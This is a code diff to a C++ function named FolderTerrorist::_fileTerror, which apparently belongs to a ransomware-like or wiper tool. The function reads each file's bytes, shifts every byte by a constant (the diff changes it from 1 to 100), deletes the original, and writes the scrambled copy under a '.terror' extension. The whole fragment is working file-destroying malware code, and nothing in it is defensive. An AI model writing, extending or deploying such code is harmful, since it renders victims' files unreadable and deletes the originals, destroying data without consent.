@@ -88,18 +88,18 @@ void FolderTerrorist::_fileTerror(const fs::path &fileName) {
     std::ifstream ifs(fileName, std::ios::binary);
     ifs.seekg(0, std::ios::end);
     auto filesize = ifs.tellg();
-    std::vector<uint8_t> data(filesize);
+    std::vector<char> data(filesize);
     ifs.seekg(0, std::ios::beg);
     ifs.read(reinterpret_cast<char *>(data.data()), filesize);
-    std::transform(data.begin(), data.end(), data.begin(), [](uint8_t byte) {
-        return ++byte;
+    std::transform(data.begin(), data.end(), data.begin(), [](char byte) {
+        return byte+100;
     });
     ifs.close();
-    std::remove(fileName.c_str());
+    fs::remove(fileName);
     fs::path new_filename = fileName.string() + ".terror";
     fs::path p = fs::path(fileName).parent_path() / new_filename;
     std::ofstream ofs(p, std::ios::binary);
-    ofs.write(reinterpret_cast<const char *>(data.data()), data.size());
+    ofs.write(reinterpret_cast<char *>(data.data()), data.size());
     ofs.close();
 }
 
